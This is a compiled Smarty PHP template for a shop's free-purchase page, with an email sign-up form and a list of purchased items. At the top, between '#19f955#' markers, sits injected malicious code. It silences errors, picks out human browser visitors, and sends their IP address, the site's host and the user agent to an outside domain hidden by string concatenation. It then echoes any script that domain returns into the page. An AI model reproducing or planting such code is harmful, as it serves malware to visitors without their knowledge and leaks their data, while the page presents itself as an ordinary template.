<?php /* Smarty version 2.6.22, created on 2009-05-27 12:10:31
         compiled from /home/a1425978/public_html/beta//templates/free_purchase.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php if (! $this->_tpl_vars['email']): ?>
	<p>To complete your purchase, you must first sign up for an account.  
	Signing up is very simple!  Just enter your valid email address below:</p>
	
	<form action="index.php" method="POST" />
		<p>
			<label>Email:<br /></label>
			<input type="text" name="email" class="textField" />
			<input type="submit" value="Give Me the Items!" class="buttonSubmit" />
			<input type="hidden" name="free_purchase" value="true" />
		</p>
	</form>
<?php else: ?>
	<h2>Thank you for purchasing the following items:</h2>
	<ul>
	<?php $_from = $this->_tpl_vars['cart']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>
	
		<li><?php echo $this->_tpl_vars['item']['name']; ?>
</li>
	<?php endforeach; endif; unset($_from); ?>
	</ul>
	<hr />
	Total Paid: $<?php echo $this->_tpl_vars['subtotal']; ?>

	<p>&nbsp;</p>
	<strong>You may download your items in the <a href="customers.php">Customer's Section</a></strong>
<?php endif; ?>